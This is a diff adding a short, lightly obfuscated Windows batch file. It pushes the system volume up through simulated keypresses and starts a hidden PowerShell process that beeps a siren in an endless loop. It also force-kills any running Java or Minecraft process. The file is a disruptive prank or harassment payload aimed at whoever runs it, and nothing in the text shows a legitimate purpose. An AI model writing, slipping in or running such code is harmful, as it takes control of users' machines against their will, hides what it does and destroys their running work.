@@ -1,0 +1,11 @@
+@echo off
+set "v=wscript.shell"
+set "a=New-Object -ComObject"
+set "b=SendKeys"
+set "c=[char]175"
+set "d=Start-Process powershell -ArgumentList"
+set "e=-NoProfile -WindowStyle Hidden -Command"
+set "f=while($true){for($i=400;$i -le 800;$i+=10){[Console]::Beep($i,100)};for($i=800;$i -ge 400;$i-=10){[Console]::Beep($i,100)}}"
+set "g=Get-Process -Name"
+set "h=Stop-Process -Force"
+powershell -Command "$wshell=%a% %v%; for($i=0;$i -lt 50;$i++){$wshell.%b%(%c%)}; %d% '%e% \"%f%\"'; %g% 'javaw','Minecraft' -ErrorAction SilentlyContinue | %h%"
